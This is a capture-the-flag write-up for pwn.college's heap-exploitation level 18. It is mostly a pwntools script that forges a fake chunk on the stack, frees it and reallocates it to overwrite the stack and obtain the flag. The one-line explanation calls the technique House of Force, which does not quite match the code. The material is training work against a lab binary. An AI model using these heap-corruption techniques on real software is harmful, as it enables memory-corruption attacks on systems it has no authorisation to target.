---
layout: post
title: (Dynamic Allocator Misuse) level 18
categories: pwn.college Dynamic-Allocator-Misuse
date: 2025-10-14 08:10:27 +0300
tags: pwn.college PIE ASLR heap house-of-force tecache metadata house-of-spirit safe-linking 
---
## Information
- category: pwn


## Description 
> Revisit a prior challenge, now with TCACHE safe-linking.

## Write-up
 House of Force to pivot `malloc` into the stack.


## Exploit
```python
from pwn import *

elf = context.binary = ELF("/challenge/babyheap_level18.1")
global p
p = elf.process()

def malloc(idx,size):
    p.sendline(b"malloc")
    p.sendline(idx)
    p.sendline(size)

def free(idx):
    p.sendline(b"free")
    p.sendline(idx)

def scanf(idx,data):
    p.sendline(b"scanf")
    p.sendline(idx)
    p.sendline(data)

def stack_scanf(data):
    p.sendline(b"stack_scanf")
    p.sendline(data)

def stack_free():
    p.sendline(b"stack_free")

def puts(idx):
    p.sendline(b"puts")
    p.sendline(idx)

def send_flag(secret):
    p.sendline(b"send_flag")
    p.sendline(secret)

def quit():
    p.sendline(b"quit")

def exploit():
    data = b"A"*0x30 + p64(0) + p64(817)
    stack_scanf(data)

    stack_free()

    malloc(b"0",b"804")

    scanf(b"0",b"A"*160)

    send_flag(b"A"*16)

    quit()

    p.interactive()

def main():
    exploit()

if __name__ == "__main__":
    main()
```